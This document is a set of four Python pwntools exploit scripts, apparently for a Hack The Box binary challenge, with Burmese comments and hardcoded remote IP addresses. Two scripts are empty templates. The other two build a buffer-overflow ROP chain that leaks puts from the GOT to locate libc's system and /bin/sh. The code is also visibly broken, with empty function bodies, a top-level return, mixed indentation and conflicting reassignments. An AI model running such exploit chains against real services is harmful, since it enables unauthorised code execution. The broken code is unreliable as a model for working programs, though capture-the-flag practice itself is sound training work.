
```python
from pwn import *

context.log_level = 'info'
context.binary = "./"
elf = context.binary
libc = elf.libc

def start():
    if args.R:
        return remote("10.49.173.178", 9009)
    elif args.G:
        return gdb.debug(elf.path, gdbscript='''
            break main
        ''')
    else:
        return process(elf.path)

def exploit(p):


if __name__ == '__main__':
    io = start()
    exploit(io)
```



```python
from pwn import *

context.log_level = 'debug'
context.binary = "./"
elf = context.binary

def start():
    if args.R:
        # Remote Server ဆိုရင် HTB ရဲ့ libc ကို သုံးမယ်
        return remote("154.57.164.76", 30227), ELF("./libc.so.6")
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            b main        
            continue
        '''), elf.libc
    else:
        # Local Process ဆိုရင် မင်း Kali ရဲ့ native libc ကိုပဲ သုံးရမယ်
        return process(elf.path), elf.libc

def exploit(io):


if __name__ == '__main__':
    io, libc = start()
    return_value = exploit(io)

```


```python

from pwn import *

context.log_level = 'info'
context.binary = "./vuln"
elf = context.binary

def start():
    if args.R:
        return remote("10.49.173.178", 9009)
    elif args.G:
        return gdb.debug(elf.path, gdbscript='''
            break main
        ''')
    else:
        return process(elf.path)

def exploit(p):
	#bss
	bss = elf.bss()

    # Get binary addresses
    print(f"[+] Binary base: {hex(elf.address)}")
    print(f"[+] puts@got: {hex(elf.got['puts'])}")
    print(f"[+] puts@plt: {hex(elf.plt['puts'])}")
    print(f"[+] main: {hex(elf.symbols['main'])}")
    
    # Get ROP gadgets
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])
    print(f"[+] pop rdi; ret: {hex(pop_rdi)}")
    
    # Leak puts address
    payload = b'A' * 40
    payload += p64(pop_rdi)
    payload += p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])
    payload += p64(elf.symbols['main'])
    
    p.recvline()
    p.send(payload)
    
    leaked = p.recvline().strip().ljust(8, b'\x00')
    puts_addr = u64(leaked)
    print(f"[+] Leaked puts: {hex(puts_addr)}")

if __name__ == '__main__':
    io = start()
    exploit(io)
    io.interactive()
```


```python
from pwn import *

context.log_level = 'debug'
context.binary = "./vuln"
elf = context.binary

def start():
    if args.R:
        libc = ELF("./libc.so.6")
        return remote("154.57.164.76", 30227), libc
    elif args.G:
        return gdb.debug(elf.path, gdbscript='''
            b main
            continue
        '''), elf.libc
    else:
        return process(elf.path), elf.libc

def exploit(io, libc):
	#bss
	bss = elf.bss()
    # Binary addresses
    print(f"[+] Binary base: {hex(elf.address)}")
    print(f"[+] puts@got: {hex(elf.got['puts'])}")
    print(f"[+] puts@plt: {hex(elf.plt['puts'])}")
    
    # Libc addresses
    print(f"[+] Libc base: {hex(libc.address)}")
    print(f"[+] system@libc: {hex(libc.symbols['system'])}")
    print(f"[+] /bin/sh@libc: {hex(next(libc.search(b'/bin/sh')))}")
    
    # ROP gadgets
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    pop_rdi = rop.rdi.address
    print(f"[+] pop rdi; ret: {hex(pop_rdi)}")
    
    # Leak puts
    payload = b'A' * 40
    payload += p64(pop_rdi)
    payload += p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])
    payload += p64(elf.symbols['main'])
    
    io.recvline()
    io.send(payload)
    
    leaked = io.recvline().strip().ljust(8, b'\x00')
    puts_leak = u64(leaked)
    
    # Calculate libc base
    libc_base = puts_leak - libc.symbols['puts']
    print(f"[+] Calculated libc base: {hex(libc_base)}")
    print(f"[+] system: {hex(libc_base + libc.symbols['system'])}")
    print(f"[+] /bin/sh: {hex(libc_base + next(libc.search(b'/bin/sh')))}")

if __name__ == '__main__':
    io, libc = start()
    exploit(io, libc)
    io.interactive()
```